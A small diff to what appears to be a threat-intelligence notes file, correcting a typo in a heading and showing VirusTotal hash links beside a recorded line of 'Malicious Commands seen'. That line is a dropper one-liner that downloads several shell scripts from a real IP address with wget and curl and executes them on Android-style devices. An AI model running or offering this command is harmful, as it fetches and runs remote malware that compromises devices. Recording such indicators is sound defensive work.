@@ -20,7 +20,7 @@ https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46
 d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 cd /data/local/tmp/; busybox wget http://14.225.213.142/w.sh; sh w.sh; curl http://14.225.213.142/c.sh; sh c.sh; wget http://14.225.213.142/wget.sh; sh wget.sh; curl http://14.225.213.142/wget.sh; sh wget.sh; busybox wget http://14.225.213.142/wget.sh; sh wget.sh; busybox curl http://14.225.213.142/wget.sh; sh wget.sh
 
